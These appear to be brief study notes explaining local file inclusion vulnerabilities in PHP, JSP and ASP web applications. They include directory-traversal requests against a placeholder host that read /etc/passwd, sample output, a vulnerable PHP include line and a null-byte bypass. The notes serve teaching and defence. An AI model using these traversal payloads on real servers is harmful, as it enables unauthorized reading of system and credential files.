The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a "dynamic file inclusion" mechanisms implemented in the target application

Can  lead to:
-DOS(Denial of Service)
-Code execution on the web server
-Code execution on client side (JAVASCRIPT),cross site scripting (XSS)

L(local)FI-process of including files, that are already locally present on the server
a page receives, as input, the path to the file that has to be included and this input is not properly sanitized, allowing directory traversal characters (such as dot-dot-slash) to be injected.
Caused-
-PHP
-JSP
-ASP

eg.:"http://vulnerable_host/preview.php?file=../../../../etc/passwd"
Output:root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
alex:x:500:500:alex:/home/alex:/bin/bash
margo:x:501:501::/home/margo:/bin/bash
...

eg.:"<?php “include/”.include($_GET['filename'].“.php”); ?>"
Output:simple substitution with arbitrary filename would not work as the postfix 'php' is appended
%00 effectively presents the end of the string, any characters after this special byte will be ignored. Thus, the following request will also return an attacker list of basic users attributes:

http://vulnerable_host/preview.php?file=../../../../etc/passwd%00
http://vulnerable_host/preview.php?file=../../../../etc/passwd%00jpg
